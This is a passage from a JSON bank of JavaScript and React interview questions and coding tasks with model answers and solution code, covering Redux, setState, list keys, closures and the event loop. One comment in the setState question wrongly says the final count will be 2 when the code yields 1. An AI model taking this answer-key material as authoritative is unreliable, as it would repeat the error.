          "answer": "Redux adheres to three fundamental principles that ensure predictable state management:\n\n1.  **Single Source of Truth:** The entire application's state is stored in a single, plain JavaScript object tree within one 'store'. This means there's only one place to find any piece of state, simplifying debugging and state synchronization across different parts of the application.\n\n2.  **State is Read-Only:** The only way to change the state is by emitting an action, which is a plain JavaScript object describing what happened (e.g., `{ type: 'ADD_TODO', text: 'Learn Redux' }`). You cannot directly modify the state object. This ensures that changes are explicit, traceable, and prevents accidental mutations, making it easier to understand how the state evolved.\n\n3.  **Changes Are Made with Pure Functions (Reducers):** To specify how the state tree is transformed by actions, you write pure functions called reducers. A reducer takes the current state and an action as arguments, and returns a *new* state object. It must not mutate the original state, perform side effects (like API calls or DOM manipulations), or have any randomness. This purity guarantees that given the same state and action, reducers will always produce the same output, leading to predictable state changes and easier testing.",
          "analysisPoints": [
            "Correctly lists all three principles.",
            "Provides a clear and concise explanation for each principle.",
            "Highlights the importance of each principle in ensuring predictability."
          ],
          "keyConcepts": [
            "Redux Principles",
            "Single Source of Truth",
            "State Immutability",
            "Pure Functions",
            "Reducers",
            "Actions"
          ],
          "evaluationCriteria": [
            "In-depth knowledge of Redux's core philosophy.",
            "Ability to articulate the rationale behind each principle."
          ],
          "example": "",
          "tags": [
            "Redux",
            "State Management",
            "Architecture",
            "Principles"
          ],
          "prerequisites": [
            "Redux_Basics"
          ],
          "complexity": 8,
          "interviewFrequency": 6,
          "learningPath": "advanced"
        },
        {
          "id": "question_react_setstate_async",
          "topic": "React setState()",
          "level": "medium",
          "type": "mcq",
          "question": "Given the following React class component method, what will be the most likely output in the console when `handleClick` is called?\n```javascript\nclass MyComponent extends React.Component {\n  state = { count: 0 };\n\n  handleClick = () => {\n    this.setState({ count: this.state.count + 1 });\n    console.log(this.state.count);\n\n    this.setState({ count: this.state.count + 1 });\n    console.log(this.state.count);\n  };\n\n  render() {\n    return <button onClick={this.handleClick}>Click</button>;\n  }\n}\n```\nAssume the initial `count` is 0.",
          "answer": "0\n0",
          "options": [
            "0\n1",
            "1\n2",
            "0\n0",
            "1\n1"
          ],
          "analysisPoints": [
            " `setState()` is asynchronous and React often batches multiple calls for performance.",
            "Therefore, `this.state.count` inside the `handleClick` function will likely still reflect the state *before* the `setState` calls have been processed and applied.",
            "Both `console.log` statements will read the `count` value as it was at the beginning of the `handleClick` execution (0)."
          ],
          "keyConcepts": [
            "React setState",
            "Asynchronous Operations",
            "State Batching",
            "Class Components"
          ],
          "evaluationCriteria": [
            "Understanding of `setState()`'s asynchronous nature.",
            "Knowledge of state batching in React."
          ],
          "example": "```javascript\n// In a real browser environment, due to batching of setState calls \n// within an event handler, both console.logs will likely output the original state value.\n// The final count will be 2 (from two +1 operations), but the console logs happen before that update is reflected.\n```",
          "tags": [
            "React",
            "setState",
            "Asynchronous",
            "MCQ"
          ],
          "prerequisites": [
            "React_State"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_setstate_functional_use_case_code",
          "topic": "React setState()",
          "level": "medium",
          "type": "code",
          "question": "You want to increment a counter in a React class component based on its current state. You also need to perform another action immediately after the state has *definitively* updated. Write the `handleClick` method for a `Counter` component that achieves this, using best practices for `setState`.",
          "answer": "```javascript\nclass Counter extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n  }\n\n  handleClick = () => {\n    // Functional form of setState for updates based on previous state\n    this.setState((prevState) => ({\n      count: prevState.count + 1\n    }), () => {\n      // Callback function executed AFTER state is updated and component re-rendered\n      console.log('State updated to:', this.state.count);\n      // Perform other actions that depend on the updated state here\n      this.props.onCountChange(this.state.count);\n    });\n  };\n\n  render() {\n    return (\n      <div>\n        <p>Count: {this.state.count}</p>\n        <button onClick={this.handleClick}>Increment</button>\n      </div>\n    );\n  }\n}\n```",
          "analysisPoints": [
            "Correct use of the functional form of `setState` (`prevState` => `newState`) for reliable updates.",
            "Correct use of the `setState` callback to ensure code runs after the state update.",
            "Demonstrates a practical scenario (e.g., passing updated state to a parent)."
          ],
          "keyConcepts": [
            "React setState",
            "Functional Updates",
            "Asynchronous Operations",
            "Callbacks",
            "Class Components"
          ],
          "evaluationCriteria": [
            "Ability to use functional `setState`.",
            "Correct implementation of `setState` callback.",
            "Understanding of reliable state updates."
          ],
          "example": "```javascript\n// See answer for example code.\n```",
          "tags": [
            "React",
            "setState",
            "Code Challenge",
            "Best Practices"
          ],
          "prerequisites": [
            "React_State",
            "React_Class_Components"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_react_refactor_list_keys",
          "title": "Refactor React List Keys",
          "description": "\nYou are given a React functional component `ShoppingCart` that displays a list of `cartItems`. Currently, it uses the array `index` as the `key` prop for its `CartItem` sub-components. This is causing issues when items are removed or reordered.\n\nYour task is to refactor the `ShoppingCart` component to use a stable, unique identifier as the `key` prop. Assume each `cartItem` object has a unique `id` property.\n\n**Requirements:**\n1.  Modify `ShoppingCart` to map `cartItems` using `item.id` as the `key`.\n2.  Keep the `CartItem` component unchanged, as it correctly displays item details.\n3.  Demonstrate how removing an item (e.g., 'Banana') now correctly updates the list without state mix-ups. You can simulate removal by filtering the `cartItems` state.\n",
          "difficulty": "medium",
          "startingCode": "import React, { useState } from 'react';\n\n// Assume this component has some internal state, e.g., input for quantity\n// For simplicity, we'll just show its name here.\nfunction CartItem({ item, onRemove }) {\n  console.log(`Rendering CartItem: ${item.name} with key: ${item.id}`); // Added for debugging\n  const [quantity, setQuantity] = useState(1); // Simulating internal state\n\n  return (\n    <li style={{ border: '1px solid #ccc', margin: '5px', padding: '5px' }}>\n      {item.name} (Qty: {quantity})\n      <button onClick={() => setQuantity(quantity + 1)}>Add More</button>\n      <button onClick={() => onRemove(item.id)} style={{ marginLeft: '10px' }}>Remove</button>\n    </li>\n  );\n}\n\nfunction ShoppingCart() {\n  const initialCart = [\n    { id: 'uuid-1', name: 'Apple' },\n    { id: 'uuid-2', name: 'Banana' },\n    { id: 'uuid-3', name: 'Orange' }\n  ];\n\n  const [cartItems, setCartItems] = useState(initialCart);\n\n  const removeItem = (idToRemove) => {\n    setCartItems(prevItems => prevItems.filter(item => item.id !== idToRemove));\n  };\n\n  return (\n    <div>\n      <h2>Shopping Cart (Bad Key Practice)</h2>\n      <ul>\n        {cartItems.map((item, index) => (\n          // BAD PRACTICE: Using index as key\n          <CartItem key={index} item={item} onRemove={removeItem} />\n        ))}\n      </ul>\n    </div>\n  );\n}\n\nexport default ShoppingCart;\n",
          "solutionCode": "import React, { useState } from 'react';\n\n// Assume this component has some internal state, e.g., input for quantity\n// For simplicity, we'll just show its name here.\nfunction CartItem({ item, onRemove }) {\n  // console.log(`Rendering CartItem: ${item.name} with key: ${item.id}`); // Keep for debugging insight\n  const [quantity, setQuantity] = useState(1); // Simulating internal state\n\n  return (\n    <li style={{ border: '1px solid #ccc', margin: '5px', padding: '5px' }}>\n      {item.name} (Qty: {quantity})\n      <button onClick={() => setQuantity(quantity + 1)}>Add More</button>\n      <button onClick={() => onRemove(item.id)} style={{ marginLeft: '10px' }}>Remove</button>\n    </li>\n  );\n}\n\nfunction ShoppingCart() {\n  const initialCart = [\n    { id: 'uuid-1', name: 'Apple' },\n    { id: 'uuid-2', name: 'Banana' },\n    { id: 'uuid-3', name: 'Orange' }\n  ];\n\n  const [cartItems, setCartItems] = useState(initialCart);\n\n  const removeItem = (idToRemove) => {\n    setCartItems(prevItems => prevItems.filter(item => item.id !== idToRemove));\n  };\n\n  return (\n    <div>\n      <h2>Shopping Cart (Good Key Practice)</h2>\n      <ul>\n        {cartItems.map(item => (\n          // GOOD PRACTICE: Using item.id as key\n          <CartItem key={item.id} item={item} onRemove={removeItem} />\n        ))}\n      </ul>\n    </div>\n  );\n}\n\nexport default ShoppingCart;\n",
          "testCases": [
            "Initial render: All items should render correctly.",
            "Remove 'Banana' (id 'uuid-2'): The list should update, 'Apple' and 'Orange' should remain, and 'Orange' (original 'uuid-3') should retain any internal state it might have had (e.g., increased quantity).",
            "Add a new item dynamically: Ensure the new item is added correctly without affecting existing items.",
            "Verify `key` prop usage: Inspect the rendered DOM elements to ensure `data-key` attributes (or similar inspection) reflect `item.id` values, not indices."
          ],
          "hints": [
            "Focus on the `map` function within `ShoppingCart`.",
            "The `CartItem` component's `key` prop is the only place you need to change.",
            "Remember that each item in `initialCart` already has a unique `id` property."
          ],
          "tags": [
            "React",
            "Keys",
            "Lists",
            "Best Practices",
            "Refactoring"
          ],
          "timeEstimate": 20,
          "prerequisites": [
            "React_Components",
            "React_State",
            "React_Keys"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_react_key_best_practices",
            "question_react_key_index_issue"
          ]
        },
        {
          "id": "task_event_delegation_list",
          "title": "Implement Click Counter with Event Delegation",
          "description": "\nCreate an HTML page with a list (`<ul>`) containing several list items (`<li>`). Your task is to implement a click counter for each list item using **event delegation**. The counter for each item should be displayed next to its text. When an `<li>` is clicked, its individual counter should increment, and an alert should show the updated count for that specific item. You should only attach **one** event listener to the parent `<ul>`.\n\n**Requirements:**\n1.  HTML: A `<ul>` with at least 3 `<li>` elements, each containing some initial text (e.g., 'Item 1').\n2.  JavaScript: Implement event delegation on the `<ul>`.\n3.  Maintain individual click counts for each `<li>`.\n4.  Display the current count next to each `<li>`'s text.\n5.  When an `<li>` is clicked, increment its count and show an `alert` with the item's text and its new count.\n6.  Ensure newly added `<li>` elements are also handled by the existing listener.\n",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Event Delegation Click Counter</title>\n    <style>\n        li { cursor: pointer; padding: 5px; margin: 2px; border: 1px solid #eee; }\n        li:hover { background-color: #f0f0f0; }\n    </style>\n</head>\n<body>\n    <h1>Click Counter (Event Delegation)</h1>\n    <ul id=\"myList\">\n        <li data-item-id=\"item1\">Item 1 <span class=\"count\">(0)</span></li>\n        <li data-item-id=\"item2\">Item 2 <span class=\"count\">(0)</span></li>\n        <li data-item-id=\"item3\">Item 3 <span class=\"count\">(0)</span></li>\n    </ul>\n    <button id=\"addItemBtn\">Add New Item</button>\n\n    <script>\n        // Your JavaScript code goes here\n        const myList = document.getElementById('myList');\n        const addItemBtn = document.getElementById('addItemBtn');\n        let nextItemId = 4; // For dynamically added items\n\n        // You will need a way to store counts for each item\n        const itemCounts = {}; // Consider how to initialize and update this\n\n        // Add event listener to the parent list\n        myList.addEventListener('click', function(event) {\n          // TODO: Implement event delegation logic\n          // Check if the clicked target is an LI\n          // Get the item's ID from data-item-id attribute\n          // Update the count in itemCounts\n          // Update the DOM to reflect the new count\n          // Show an alert\n        });\n\n        addItemBtn.addEventListener('click', function() {\n          const newItemText = `Item ${nextItemId}`;\n          const newItemId = `item${nextItemId}`;\n          const newLi = document.createElement('li');\n          newLi.setAttribute('data-item-id', newItemId);\n          newLi.innerHTML = `${newItemText} <span class=\"count\">(0)</span>`;\n          myList.appendChild(newLi);\n          itemCounts[newItemId] = 0; // Initialize count for new item\n          nextItemId++;\n        });\n    </script>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Event Delegation Click Counter</title>\n    <style>\n        li { cursor: pointer; padding: 5px; margin: 2px; border: 1px solid #eee; }\n        li:hover { background-color: #f0f0f0; }\n    </style>\n</head>\n<body>\n    <h1>Click Counter (Event Delegation)</h1>\n    <ul id=\"myList\">\n        <li data-item-id=\"item1\">Item 1 <span class=\"count\">(0)</span></li>\n        <li data-item-id=\"item2\">Item 2 <span class=\"count\">(0)</span></li>\n        <li data-item-id=\"item3\">Item 3 <span class=\"count\">(0)</span></li>\n    </ul>\n    <button id=\"addItemBtn\">Add New Item</button>\n\n    <script>\n        const myList = document.getElementById('myList');\n        const addItemBtn = document.getElementById('addItemBtn');\n        let nextItemId = 4;\n\n        // Use a Map or an Object to store counts, initializing for existing items\n        const itemCounts = {\n            'item1': 0,\n            'item2': 0,\n            'item3': 0\n        };\n\n        myList.addEventListener('click', function(event) {\n          // Ensure the click was directly on an LI, not on the SPAN or UL itself\n          const clickedItem = event.target.closest('li');\n\n          if (clickedItem) {\n            const itemId = clickedItem.dataset.itemId;\n            // Initialize count if it's a new item added dynamically and clicked for the first time\n            if (itemCounts[itemId] === undefined) {\n                itemCounts[itemId] = 0;\n            }\n            itemCounts[itemId]++;\n            \n            // Update the display in the DOM\n            const countSpan = clickedItem.querySelector('.count');\n            if (countSpan) {\n              countSpan.textContent = `(${itemCounts[itemId]})`;\n            }\n            \n            alert(`'${clickedItem.firstChild.textContent.trim()}' clicked! New count: ${itemCounts[itemId]}`);\n          }\n        });\n\n        addItemBtn.addEventListener('click', function() {\n          const newItemText = `Item ${nextItemId}`;\n          const newItemId = `item${nextItemId}`;\n          const newLi = document.createElement('li');\n          newLi.setAttribute('data-item-id', newItemId);\n          newLi.innerHTML = `${newItemText} <span class=\"count\">(0)</span>`;\n          myList.appendChild(newLi);\n          itemCounts[newItemId] = 0; // Initialize count for new item\n          nextItemId++;\n        });\n    </script>\n</body>\n</html>\n",
          "testCases": [
            "Click on 'Item 1': Its count should increment to 1, and an alert should appear.",
            "Click on 'Item 1' again: Its count should increment to 2.",
            "Click on 'Item 2': Its count should increment to 1, independently of 'Item 1'.",
            "Click 'Add New Item' button: A new item should appear in the list.",
            "Click on the newly added item: Its count should increment, demonstrating that the single listener handles dynamically added elements.",
            "Click on an area of the list that is not an `<li>` (e.g., padding on the `<ul>`): No alert or count increment should occur."
          ],
          "hints": [
            "Use `event.target` to identify the element that was actually clicked.",
            "`event.target.tagName` or `event.target.closest('li')` can help verify if the clicked element is an `<li>` or one of its children.",
            "You'll need a JavaScript object or `Map` to store the counts for each item, perhaps keyed by a `data-item-id` attribute on the `<li>`.",
            "Remember to update both your JavaScript data structure (for counts) and the DOM element's text content."
          ],
          "tags": [
            "JavaScript",
            "DOM",
            "Events",
            "Event Delegation",
            "Front-end"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "JavaScript_Basics",
            "DOM_Manipulation",
            "Event_Bubbling"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_javascript_fundamentals",
            "question_js_event_delegation_explanation"
          ]
        },
        {
          "id": "task_closure_private_counter",
          "title": "Build a Private Counter Module with Closure",
          "description": "\nImplement a JavaScript module that exports a factory function `createPrivateCounter`. This function should return an object with two methods: `increment()` and `getCount()`. The counter's value should be private and only accessible or modifiable through these two methods.\n\n**Requirements:**\n1.  Define a function `createPrivateCounter`.\n2.  Inside `createPrivateCounter`, declare a variable `count` initialized to `0`. This variable must be truly private to the returned object.\n3.  Return an object with:\n    *   `increment()`: A method that increments `count` by 1 and returns the new count.\n    *   `getCount()`: A method that returns the current `count`.\n4.  Demonstrate that each instance created by `createPrivateCounter` has its own independent `count`.\n",
          "difficulty": "medium",
          "startingCode": "function createPrivateCounter() {\n  // TODO: Declare a private 'count' variable\n\n  return {\n    increment: function() {\n      // TODO: Increment and return count\n    },\n    getCount: function() {\n      // TODO: Return count\n    }\n  };\n}\n\n// Example Usage (for testing your implementation):\n// const counter1 = createPrivateCounter();\n// console.log(counter1.getCount()); // Should be 0\n// console.log(counter1.increment()); // Should be 1\n// console.log(counter1.getCount()); // Should be 1\n//\n// const counter2 = createPrivateCounter();\n// console.log(counter2.getCount()); // Should be 0 (independent)\n// console.log(counter1.increment()); // Should be 2\n",
          "solutionCode": "function createPrivateCounter() {\n  let count = 0; // This 'count' variable is private due to closure\n\n  return {\n    increment: function() {\n      count++;\n      return count;\n    },\n    getCount: function() {\n      return count;\n    }\n  };\n}\n\n// Demonstrating independent instances:\nconst counter1 = createPrivateCounter();\nconsole.log(\"Counter 1 Initial:\", counter1.getCount()); // Output: 0\nconsole.log(\"Counter 1 Increment:\", counter1.increment()); // Output: 1\nconsole.log(\"Counter 1 Increment:\", counter1.increment()); // Output: 2\nconsole.log(\"Counter 1 Current:\", counter1.getCount());   // Output: 2\n\nconst counter2 = createPrivateCounter();\nconsole.log(\"Counter 2 Initial:\", counter2.getCount()); // Output: 0 (independent from counter1)\nconsole.log(\"Counter 2 Increment:\", counter2.increment()); // Output: 1\nconsole.log(\"Counter 1 Current (again):\", counter1.getCount()); // Output: 2 (counter1 still at 2)\n",
          "testCases": [
            "`counter1.getCount()` after initialization should return 0.",
            "Multiple calls to `counter1.increment()` should correctly increase its count.",
            "`counter2 = createPrivateCounter()` should create an independent counter starting from 0.",
            "Operations on `counter1` should not affect `counter2` and vice-versa.",
            "Attempting to directly access `counter1.count` or `counter2.count` should result in `undefined` (demonstrating privacy)."
          ],
          "hints": [
            "The `count` variable should be declared within `createPrivateCounter` but outside the returned object's methods.",
            "The inner functions will naturally form a closure over `count`."
          ],
          "tags": [
            "JavaScript",
            "Closures",
            "Encapsulation",
            "Functions",
            "Module Pattern"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "JavaScript_Functions",
            "Scope"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_javascript_fundamentals",
            "question_js_closure_definition",
            "question_js_closure_use_case_code"
          ]
        },
        {
          "id": "task_event_loop_prediction",
          "title": "Predict Event Loop Execution Order",
          "description": "\nGiven a series of JavaScript statements involving synchronous code, `setTimeout`, and `Promise.resolve`, you need to predict the exact order of console outputs based on the Event Loop mechanism. Explain your reasoning step-by-step, detailing which queue each task goes into and when it's processed.\n\n**Task:**\n1.  Analyze the provided code snippet.\n2.  Determine the final output order.\n3.  Write a detailed explanation of *why* the output is in that order, referring to the Call Stack, Web APIs, Microtask Queue, and Callback Queue.\n",
          "difficulty": "hard",
          "startingCode": "```javascript\nconsole.log('Start');\n\nsetTimeout(() => {\n  console.log('Timeout 1 (0ms)');\n}, 0);\n\nPromise.resolve().then(() => {\n  console.log('Promise 1');\n});\n\nconsole.log('Middle');\n\nsetTimeout(() => {\n  console.log('Timeout 2 (10ms)');\n}, 10);\n\nPromise.resolve().then(() => {\n  console.log('Promise 2');\n});\n\nfunction syncFunction() {\n  console.log('Sync Function');\n}\nsyncFunction();\n\nconsole.log('End');\n```\n",
          "solutionCode": "```javascript\n// Expected Output Order:\n// Start\n// Middle\n// Sync Function\n// End\n// Promise 1\n// Promise 2\n// Timeout 1 (0ms)\n// Timeout 2 (10ms)\n\n// Step-by-step Explanation:\n\n// 1. Initial Synchronous Execution:\n//    - `console.log('Start');` -> Logs 'Start'. Call Stack: [console.log]\n//    - `setTimeout(() => { console.log('Timeout 1 (0ms)'); }, 0);` -> Timer starts, callback moves to Web API, then to Callback (Macrotask) Queue when 0ms expires. Call Stack: []\n//    - `Promise.resolve().then(() => { console.log('Promise 1'); });` -> Promise resolves immediately, callback moves to Microtask Queue. Call Stack: []\n//    - `console.log('Middle');` -> Logs 'Middle'. Call Stack: [console.log]\n//    - `setTimeout(() => { console.log('Timeout 2 (10ms)'); }, 10);` -> Timer starts, callback moves to Web API, then to Callback (Macrotask) Queue after 10ms. Call Stack: []\n//    - `Promise.resolve().then(() => { console.log('Promise 2'); });` -> Promise resolves immediately, callback moves to Microtask Queue. Call Stack: []\n//    - `syncFunction();` -> `console.log('Sync Function');` -> Logs 'Sync Function'. Call Stack: [syncFunction, console.log]\n//    - `console.log('End');` -> Logs 'End'. Call Stack: [console.log]\n//    At this point, all synchronous code is done. Call Stack is empty.\n\n// Current state of queues (conceptual):\n// Microtask Queue: [() => { console.log('Promise 1'); }, () => { console.log('Promise 2'); }]\n// Callback Queue:  [() => { console.log('Timeout 1 (0ms)'); }, () => { console.log('Timeout 2 (10ms)'); }]\n\n// 2. Event Loop Cycle Begins (Call Stack is empty):\n//    - Event Loop checks Microtask Queue first.\n//    - Dequeues `Promise 1` callback and pushes to Call Stack.\n//    - `console.log('Promise 1');` -> Logs 'Promise 1'. Call Stack: [console.log]\n//    - Call Stack becomes empty.\n//    - Event Loop checks Microtask Queue again (it processes *all* microtasks before checking macrotasks).\n//    - Dequeues `Promise 2` callback and pushes to Call Stack.\n//    - `console.log('Promise 2');` -> Logs 'Promise 2'. Call Stack: [console.log]\n//    - Call Stack becomes empty. Microtask Queue is now empty.\n\n// 3. Event Loop Processes Callback (Macrotask) Queue:\n//    - Event Loop checks Callback Queue.\n//    - Dequeues `Timeout 1 (0ms)` callback and pushes to Call Stack.\n//    - `console.log('Timeout 1 (0ms)');` -> Logs 'Timeout 1 (0ms)'. Call Stack: [console.log]\n//    - Call Stack becomes empty.\n//    - Event Loop checks Microtask Queue (still empty).\n//    - Event Loop checks Callback Queue.\n//    - Dequeues `Timeout 2 (10ms)` callback and pushes to Call Stack (assuming 10ms has passed).\n//    - `console.log('Timeout 2 (10ms)');` -> Logs 'Timeout 2 (10ms)'. Call Stack: [console.log]\n//    - Call Stack becomes empty. Callback Queue is now empty.\n\n// The Event Loop continues to run, but all queues are empty.\n```",
          "testCases": [
            "Predict output for the given snippet.",
            "Explain the role of Call Stack, Microtask Queue, and Callback Queue.",
            "Demonstrate understanding of task priority (microtasks before macrotasks)."
          ],
          "hints": [
            "Remember that synchronous code always runs first.",
            "Understand the difference in priority between the Microtask Queue (Promises, `queueMicrotask`) and the Callback (Macrotask) Queue (`setTimeout`, `setInterval`, DOM events).",
            "The Event Loop will clear all microtasks before picking up any macrotask, even if a macrotask has a 0ms delay."
          ],
          "tags": [
            "JavaScript",
            "Event Loop",
            "Asynchronous",
            "Promises",
            "setTimeout",
            "Execution Order"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "Promises",
            "setTimeout",
            "JavaScript_Functions"
          ],
          "complexity": 9,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "theory_javascript_fundamentals",
            "question_js_event_loop_flow",
            "question_js_event_loop_mcq"
          ]
        },
        {
          "id": "task_react_simple_counter_with_props_state",
          "title": "Create a React Counter with State and Props",
          "description": "\nBuild a simple React application consisting of two components: `App` (parent) and `CounterDisplay` (child). The `App` component should manage a `count` state. The `CounterDisplay` component should receive the `count` as a prop and display it. Implement a button in the `App` component that increments the `count` state, demonstrating the unidirectional data flow from parent to child.\n\n**Requirements:**\n1.  Create a functional component `App`.\n2.  `App` should manage a piece of state called `count`, initialized to 0, using `useState`.\n3.  `App` should render a button that, when clicked, increments `count`.\n4.  Create a functional component `CounterDisplay`.\n5.  `CounterDisplay` should accept a `count` prop and display its value.\n6.  `App` should pass its `count` state down to `CounterDisplay` as a prop.\n7.  Ensure `CounterDisplay` does NOT try to modify the `count` prop directly.\n",
          "difficulty": "easy",
          "startingCode": "import React, { useState } from 'react';\n\n// Child Component\nfunction CounterDisplay(props) {\n  // TODO: Display the count prop\n  // TODO: Ensure no direct modification of props (e.g., props.count = 10;)\n  return (\n    <div>\n      {/* Your display logic here */}\n    </div>\n  );\n}\n\n// Parent Component\nfunction App() {\n  // TODO: Manage 'count' state\n  // TODO: Implement an increment function\n\n  return (\n    <div>\n      <h1>Simple Counter</h1>\n      {/* TODO: Pass count to CounterDisplay */}\n      <CounterDisplay />\n      {/* TODO: Add a button to increment count */}\n    </div>\n  );\n}\n\nexport default App;\n",
          "solutionCode": "import React, { useState } from 'react';\n\n// Child Component\nfunction CounterDisplay(props) {\n  return (\n    <h2>Current Count: {props.count}</h2>\n  );\n}\n\n// Parent Component\nfunction App() {\n  const [count, setCount] = useState(0);\n\n  const incrementCount = () => {\n    setCount(count + 1);\n  };\n\n  return (\n    <div>\n      <h1>Simple Counter</h1>\n      <CounterDisplay count={count} />\n      <button onClick={incrementCount}>Increment Count</button>\n    </div>\n  );\n}\n\nexport default App;\n",
          "testCases": [
            "Initial render: Counter display should show '0'.",
            "Click 'Increment Count' button: Counter display should update to '1'.",
            "Multiple clicks: Counter display should continue to increment correctly.",
            "Verify `CounterDisplay` receives `count` as prop and doesn't manage its own `count` state."
          ],
          "hints": [
            "Use `useState` in the `App` component to declare and manage the `count` state.",
            "Pass the `count` state from `App` to `CounterDisplay` using a prop.",
            "The `CounterDisplay` component should only read from its `props`."
          ],
          "tags": [
            "React",
            "State",
            "Props",
            "Functional Components",
            "Data Flow"
          ],
          "timeEstimate": 25,
          "prerequisites": [
            "React_Components",
            "React_State",
            "React_Hooks"
          ],
          "complexity": 4,
          "interviewRelevance": 8,
          "learningPath": "beginner",
          "relatedConcepts": [
            "theory_react_fundamentals",
            "question_react_state_vs_props"
          ]
        },
        {
          "id": "task_react_class_to_functional_component",
          "title": "Convert a Class Component to a Functional Component with Hooks",
          "description": "\nYou are provided with a React class component named `DataFetcher` that fetches data from an API and displays it. Your task is to refactor this class component into a functional component using React Hooks (`useState` and `useEffect`) to achieve the same functionality.\n\n**Original Class Component Functionality:**\n*   Fetches data from `https://jsonplaceholder.typicode.com/posts/1` when the component mounts.\n*   Stores the fetched data in its state.\n*   Displays a loading message while fetching.\n*   Displays the data (specifically the `title` and `body`) once fetched.\n*   Handles potential errors during fetching.\n\n**Requirements:**\n1.  Convert `DataFetcher` from a class component to a functional component.\n2.  Replace `this.state` with `useState` hooks for `data`, `loading`, and `error`.\n3.  Replace `componentDidMount` and any potential `componentDidUpdate` logic with `useEffect` for data fetching.\n4.  Maintain the same UI (loading, error, data display).\n",
          "difficulty": "medium",
          "startingCode": "import React, { Component } from 'react';\n\n// Original Class Component\nclass DataFetcher extends Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      data: null,\n      loading: true,\n      error: null,\n    };\n  }\n\n  componentDidMount() {\n    this.fetchData();\n  }\n\n  fetchData = async () => {\n    this.setState({ loading: true, error: null });\n    try {\n      const response = await fetch('https://jsonplaceholder.typicode.com/posts/1');\n      if (!response.ok) {\n        throw new Error(`HTTP error! status: ${response.status}`);\n      }\n      const data = await response.json();\n      this.setState({ data, loading: false });\n    } catch (error) {\n      this.setState({ error, loading: false });\n    }\n  };\n\n  render() {\n    const { data, loading, error } = this.state;\n\n    if (loading) {\n      return <div>Loading data...</div>;\n    }\n\n    if (error) {\n      return <div style={{ color: 'red' }}>Error: {error.message}</div>;\n    }\n\n    return (\n      <div>\n        <h2>Fetched Data:</h2>\n        <h3>{data.title}</h3>\n        <p>{data.body}</p>\n      </div>\n    );\n  }\n}\n\nexport default DataFetcher;\n",
          "solutionCode": "import React, { useState, useEffect } from 'react';\n\n// Converted Functional Component\nfunction DataFetcher() {\n  const [data, setData] = useState(null);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n\n  useEffect(() => {\n    const fetchData = async () => {\n      setLoading(true);\n      setError(null); // Reset error on new fetch attempt\n      try {\n        const response = await fetch('https://jsonplaceholder.typicode.com/posts/1');\n        if (!response.ok) {\n          throw new Error(`HTTP error! status: ${response.status}`);\n        }\n        const result = await response.json();\n        setData(result);\n      } catch (err) {\n        setError(err);\n      } finally {\n        setLoading(false);\n      }\n    };\n\n    fetchData();\n    // Empty dependency array ensures this effect runs only once on mount\n  }, []); \n\n  if (loading) {\n    return <div>Loading data...</div>;\n  }\n\n  if (error) {\n    return <div style={{ color: 'red' }}>Error: {error.message}</div>;\n  }\n\n  return (\n    <div>\n      <h2>Fetched Data:</h2>\n      <h3>{data.title}</h3>\n      <p>{data.body}</p>\n    </div>\n  );\n}\n\nexport default DataFetcher;\n",
          "testCases": [
            "Component loads: 'Loading data...' message should appear initially.",
            "Successful fetch: After a short delay, the title and body of the post should be displayed.",
            "Simulate network error (e.g., change URL to an invalid one): An error message should be displayed.",
            "Verify `useState` and `useEffect` are correctly used, replacing class state and lifecycle methods."
          ],
          "hints": [
            "You'll need three `useState` calls for `data`, `loading`, and `error`.",
            "`useEffect` with an empty dependency array (`[]`) behaves like `componentDidMount`.",
            "Remember to handle `async/await` within `useEffect` by defining an inner `async` function and calling it immediately."
          ],
          "tags": [
            "React",
            "Hooks",
            "useState",
            "useEffect",
            "Class Components",
            "Functional Components",
            "Refactoring",
            "Data Fetching"
          ],
          "timeEstimate": 40,
          "prerequisites": [
            "React_Class_Components",
            "React_Hooks",
            "Asynchronous_JavaScript"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_react_fundamentals",
            "question_react_hooks_definition"
          ]
        },
        {
          "id": "task_react_manage_async_state_update",
          "title": "Manage Asynchronous `setState` Updates with Callbacks and Functional Forms",
          "description": "\nCreate a React class component `AsyncCounter` that demonstrates proper handling of asynchronous `setState` updates.\n\n**Requirements:**\n1.  Initialize `count` state to 0.\n2.  Implement a button that increments `count` by 1 **twice** in a single click handler.\n3.  After the first `setState` call, log `this.state.count` *before* the state update is guaranteed to be applied (demonstrating asynchronicity).\n4.  For the second `setState` call, use the **functional form** (updater function) to increment `count` and include a **callback function** that logs the *correct, updated* `count` after both increments have been processed.\n5.  Add another button that calls an `async` function (`incrementTwiceAsync`) which uses the functional `setState` form twice in quick succession to increment the counter, simulating batched updates outside of React's direct control (e.g., within a `setTimeout`). Log the final count after these async updates.\n",
          "difficulty": "hard",
